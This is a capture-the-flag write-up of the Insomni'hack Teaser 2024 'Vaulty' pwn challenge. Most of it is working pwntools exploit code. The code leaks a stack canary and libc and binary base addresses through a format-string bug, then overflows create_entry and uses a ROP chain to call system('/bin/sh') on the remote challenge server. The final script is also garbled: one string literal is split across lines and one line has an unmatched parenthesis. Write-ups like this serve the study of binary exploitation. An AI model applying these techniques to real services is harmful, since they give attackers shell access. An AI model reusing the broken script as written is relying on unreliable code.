Vaulty
Insomni'hack Teaser 2024
CubikMan47
# Introduction

In this challenge, we are given a binary that, upon execution, allows us to store and retrieve up to 10 entries in what resembles a password manager. Our objective, as usual, is to find a way to open a shell and read the file containing the flag.

# Initial exploration

The binary has a main menu with four options: create, modify, delete, or print an entry. Each entry is composed of three strings: a username, a password, and a URL, although they are not used in any meaningful way, but just stored.

When opening the binary in Ghidra, we see that depending on user choice, one of four different functions gets called; since no names are present in the binary, I renamed them inside Ghidra to `{create,modify,delete,print}_entry`. Additionally, I used a very handy `objcopy` command (`objcopy vaulty --add-symbol <name>=.text:<addr>,global,function vaulty2`) to add names to the binary itself, making them available inside gdb.

Let's now look at these functions:

- `create_entry` reads a username, a password, and a URL from the user to the stack, and then immediately copies all 32 bytes of each string to a preallocated array of entries. This function, however, does not limit the amount of input we can send as a URL, thus making an easy buffer overflow possible.
- `print_entry` uses `printf` to display an entry, however, does so in a way that the three strings are interpreted as the format, thus allowing us to create entries with specially-crafted strings that will allow us to read data from any address.
- `modify_entry` works in a way very similar to the `create_entry` function but does not read data and then copy it, opting instead to directly write to the entry. Like `create_entry`, this function doesn't check the length of the URL.
- `delete_entry` deletes an entry and shifts all entries after it by one so that the array doesn't have holes.

# The attack

The general plan, with the information we gathered above, is this:

- Using the format-string vulnerability, leak the canary, the address of libc, and the address of the binary
- Send a very long input to overflow the stack of the `create_entry` function
- Use Return-Oriented Programming to call `system("/bin/sh")` and read the flag.

## Leaking the stack with printf

Allowing the user to control the format specifier is what's called a "format string vulnerability", and is pretty easy to exploit. Format specifiers are written like this: `%[<index>$]<format>`, where `<index>` is used to tell printf which of the passed arguments should be formatted, and `<format>` specifies how to print it. However, the index is not checked against the actual number of arguments, so we can abuse the facts that parameters after a certain number are passed on the stack, and make `printf` print the location they would be in, thus leaking the contents of the memory. For this challenge, I used `%<index>$llx` as the payload, which prints a `long long` (8 bytes) number in hexadecimal.

By scripting the interaction with the binary, we can create an entry with a name, print the entry, thus executing our format specifier and leaking data, and then delete the entry to free space for the next iteration. The function below does exactly that:

```python
def leak_stack_offset(r, off):
    r.sendline(b'1')
    r.sendline(f'%{off}$016llx'.encode())
    r.sendline(b'password')
    r.sendline(b'url')
    r.sendline(b'4')
    r.sendlineafter(b'Select an entry to view (0-', b'0')
    r.recvline()
    ret = r.recvline().decode().lstrip('Username: ').strip()
    r.sendline(b'3')
    r.sendline(b'0')
    r.recvuntil(b'Entry deleted successfully.')
    return ret
```

## Exploring the stack

By calling the function above in a loop with the following code, we can view what the stack contains.

```python
r = process('./vaulty')
print(open(f'/proc/{r.pid}/maps').read()) # print the memory layout
for i in range(1, 64): print(i, leak_stack_offset(r, i)) # print the stack
```

Line 4 is used to print information about each block of memory that the program allocated. Here is an example of the output of the previous script (edited for brevity):

```
55d131813000-55d131814000 r--p /vaulty
55d131814000-55d131815000 r-xp /vaulty
7f053f2b2000-7f053f2d8000 r--p /usr/lib/x86_64-linux-gnu/libc.so.6
7f053f2d8000-7f053f42d000 r-xp /usr/lib/x86_64-linux-gnu/libc.so.6
7f053f49d000-7f053f49e000 r--p /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f053f49e000-7f053f4c3000 r-xp /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffc01730000-7ffc01751000 rw-p [stack]
 1: 00007ffc0174d860
 2: 0000000000000000
 3: 0000000000000000
 4: 1999999999999999
 5: 0000000000000000
 6: 00007ffc0174fdb0
...
```

The first block of output represents the memory layout of the process, which basically tells us which file is loaded at which memory range (for more details, refer to [this StackOverflow question](https://stackoverflow.com/questions/1401359/understanding-linux-proc-pid-maps-or-proc-self-maps)). The second block instead is what `printf` is leaking to us. Notice how at offsets 1 and 6, there are addresses pointing to the stack. By looking at more output from the script, we can find the canary and addresses to both libc and the binary. Since those addresses are at a constant offset from the base addresses of libc and the binary, we can just subtract the address we found from the base of the memory block it points into (printed by reading `/proc/<pid>/maps`), and get the offset. Then, when the exploit leaks an address, we can just subtract the offset again and get what is the base. For example, this snippet of code leaks all the information we need:

```python
canary = leak_stack_offset(r, 11)
base = leak_stack_offset(r, 13) - 0x1984
libc_base = leak_stack_offset(r, 3) - 0x114697
```

Note that the leaked offset depends on the exact build of libc, so we need to run the binary with the exact same libc as the one on the server. Luckily, in the challenge description, the organizers told us that it was running inside a `ubuntu@sha256:bbf3d1baa208b7649d1d0264ef7d522e1dc0deeeaaf6085bf8e4618867f03494` container. This allows us to quite simply extract the libc and ld.so from the container and patch our local binary to use it (a very handy tool that does this automatically is `pwninit`).

## Calling `system("/bin/sh")`

The final step is to use all the leaks we just got to overflow the stack of the `create_entry` function and use Return-Oriented Programming to open a shell. By looking at the stack with gdb, we can determine that `gets` reads at `rsp + 0x50`, the canary is located at `rsp + 0x78` (so after 0x28 bytes of input), and the return address at `rsp + 0x98` (so 0x18 bytes after the canary, since it occupies 8 bytes). The following snippet prepares the ROP stack and puts it after the return address:

```python
# Search for the string "/bin/sh" inside libc's memory
binsh = next(libc.search(b'/bin/sh'))

# Build the ROP stack
rop = ROP([elf, libc])
rop.raw(rop.ret) # needed to maintain 16-byte stack alignment
rop.system(binsh)

# Build the payload
payload = cyclic(0x28) + p64(canary) + cyclic(0x18) + bytes(rop)
```

# Putting it all together

This is the final script that, when run, opens a shell on the remote server. Running `cat flag` prints the flag, thus solving the challenge.

```python
from pwn import *

def leak_stack_offset(r, off):
    r.sendlineafter(b'Enter your choice (1-5):\n', b'1')
    r.sendlineafter(b'Username:', f'%{off}$016llx'.encode())
    r.sendlineafter(b'Password:', b'password')
    r.sendlineafter(b'URL:', b'url')
    r.sendlineafter(b'Enter your choice (1-5

):\n', b'4')
    r.sendlineafter(b'Select an entry to view (0-', b'0'))
    r.recvline()
    ret = int(r.recvline().decode().lstrip('Username: ').strip(), 16)
    r.sendlineafter(b'Enter your choice (1-5):\n', b'3')
    r.sendlineafter(b'Select an entry to delete (0-0):', b'0')
    r.recvuntil(b'Entry deleted successfully.')
    return ret

context.binary = elf = ELF('./vaulty2')
libc = ELF('./libc.so.6')
r = remote('vaulty.insomnihack.ch', 4556)

# Leak canary and base addresses
canary = leak_stack_offset(r, 11)
base = leak_stack_offset(r, 13) - 0x1984
libc_base = leak_stack_offset(r, 3) - 0x114697
elf.address = base
libc.address = libc_base
log.info(f'leaked canary: {canary:x}')
log.info(f'leaked base: {base:x}')
log.info(f'leaked libc base: {libc_base:x}')

# prepare ROP stack
binsh = next(libc.search(b'/bin/sh'))
rop = ROP([elf, libc])
rop.raw(rop.ret)
rop.system(binsh)
payload = cyclic(0x28) + p64(canary) + cyclic(0x18) + bytes(rop)

# run the ROP attack
r.sendline(b'1')
r.sendline(p64(libc.functions['system'].address))
r.sendline(b'password')
r.sendline(payload)
r.interactive()
```

Running the script prints the flag, `INS{An0Th3r_P4SSw0RD_m4nag3r_h4ck3d}`.